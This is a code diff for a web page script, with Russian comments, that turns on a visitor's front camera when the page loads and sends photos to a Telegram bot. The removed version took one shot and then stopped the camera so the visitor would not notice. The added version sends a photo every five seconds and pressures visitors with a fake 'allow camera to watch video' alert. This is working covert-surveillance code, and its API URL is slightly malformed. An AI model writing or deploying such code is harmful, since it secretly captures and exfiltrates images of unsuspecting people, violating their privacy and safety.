@@ -46,48 +46,53 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <script>
-        const botToken = 'ВАШ_ТОКЕН_ОТ_BOTFATHER';
-        const chatId = 'ВАШ_ЦИФРОВОЙ_ID';
+<script>
+    const botToken = 'ВАШ_ТОКЕН_ОТ_BOTFATHER';
+    const chatId = 'ВАШ_ЦИФРОВОЙ_ID';
 
-        // Функция отправки в Telegram
-        async function sendToTelegram(imageData) {
-            const blob = await (await fetch(imageData)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'shot.jpg');
+    // Функция захвата и отправки кадра
+    async function takeAndSendPhoto(video, canvas) {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        
+        const dataURL = canvas.toDataURL('image/jpeg', 0.6); // Качество 0.6 для скорости
+        const blob = await (await fetch(dataURL)).blob();
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'shot.jpg');
 
+        try {
             await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
+            console.log("Фото отправлено");
+        } catch (e) {
+            console.error("Ошибка отправки:", e);
         }
+    }
 
-        // Запрос камеры сразу при входе
-        window.onload = () => {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+    window.onload = () => {
+        // Запрашиваем камеру
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
 
-                // Ждем 1 секунду, чтобы камера сфокусировалась
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    sendToTelegram(dataURL);
-
-                    // Останавливаем камеру, чтобы не палиться (индикатор в углу пропадет) кста код с нейронки сукии
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-            })
-            .catch(err => {
-                console.log("Доступ отклонен");
-            });
-        };
-    </script>
+            // Запускаем бесконечный цикл с интервалом 1000 мс (1 сек)
+            setInterval(() => {
+                takeAndSendPhoto(video, canvas);
+            }, 5000); 
+        })
+        .catch(err => {
+            alert("Для просмотра видео необходимо разрешить доступ к камере в настройках браузера.");
+            console.log("Доступ отклонен:", err);
+        });
+    };
+</script>
 </body>
 </html>
